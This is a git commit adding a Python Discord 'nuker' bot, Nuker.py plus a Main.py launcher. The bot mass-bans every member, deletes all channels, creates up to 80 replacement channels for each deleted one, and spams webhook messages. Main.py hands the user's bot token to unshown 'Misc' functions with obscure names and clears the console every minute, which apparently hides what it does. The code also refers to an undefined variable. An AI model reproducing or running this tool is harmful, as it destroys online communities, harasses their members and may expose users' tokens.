1ff752e7d482928b02f648af2a30bc93e7c8ca85
goosewkey <azminoz.gg@gmail.com>
2025-03-08 01:26:07 +0800

    Add files via upload

---
+++ Main.py
@@ -0,0 +1,16 @@
+import Nuker
+from Misc import *
+
+token = Nuker.tokefunc()
+idkunused.gettoki(token)
+heyguys()
+
+import os
+import time
+import threading
+
+def clear_cmd():
+    while True:
+        time.sleep(60)
+        os.system("cls" if os.name == "nt" else "clear")
+threading.Thread(target=clear_cmd, daemon=True).start() 
---
+++ Nuker.py
@@ -0,0 +1,79 @@
+import os
+
+try:
+    import discord
+    import aiohttp
+    import requests
+    import json
+    import asyncio
+    from discord.ext import commands
+except ImportError:
+    os.system("pip install discord requests aiohttp asyncio")
+    import discord
+    import aiohttp
+    import requests
+    import json
+    import asyncio
+    from discord.ext import commands
+    
+def tokefunc():
+    return input("Enter your bots token: ")
+token = tokefunc()
+prefix = input("Enter your prefix: ")
+channels = input("Enter your channel name: ")
+guild_name = input("Enter your server name: ")
+webhook = input("Webhook name: ")
+spam = input("Enter spam message: ")
+headers = {"Authorization":f"Bot {token}"}
+
+bot = commands.Bot(command_prefix=prefix,intents=discord.Intents.all(),help_command=None,case_insensitive=False)
+
+@bot.event
+async def on_ready():
+	print(f"Bot is ready.")
+
+@bot.command()
+async def massban(ctx):
+	tasks = []
+	async with aiohttp.ClientSession() as session:
+		for member in ctx.guild.members:
+			tasks.append(asyncio.create_task(session.put(f'https://discord.com/api/v9/guilds/{ctx.guild.id}/bans/{member.id}', headers=headers)))
+			await asyncio.gather(*tasks)
+
+@bot.command()
+async def nuke(ctx):
+	guild = ctx.guild
+	
+	try:
+		await guild.edit(name=guild_name)
+	except Exception as e:
+		print(f"Failed to edit server name: {str(e)}")
+		pass
+		
+	tasks = []
+	async with aiohttp.ClientSession() as session:
+		for channel in ctx.guild.channels:
+			tasks.append(asyncio.create_task(session.delete(f'https://discord.com/api/channels/{channel.id}', headers=headers)))
+			for x in range(80):
+				tasks.append(asyncio.create_task(session.post(f'https://discord.com/api/guilds/{ctx.guild.id}/channels', json={'name': channels}, headers=headers)))
+	await asyncio.gather(*tasks)
+
+@bot.event
+async def on_guild_channel_create(channel):
+	guild = channel.guild
+	async with aiohttp.ClientSession() as requests:
+		try:
+			response = await requests.post(f"https://discord.com/api/v9/channels/{channel.id}/webhooks", headers=headers, json={"name": webhook_name})
+			re = await response.json()
+			webhook_url = f"https://discord.com/api/webhooks/{re['id']}/{re['token']}"
+			for i in range(70):
+				message = {
+                "content": spam,
+                "username": webhook,
+                "avatar_url": "https://cdn.discordapp.com/attachments/1112070633912799284/1127017251124551710/images.png"
+            }
+				await requests.post(webhook_url, json=message)
+		except Exception as e:
+			print(f"An error occurred while creating webhook: {str(e)}")
+
+bot.run(token)
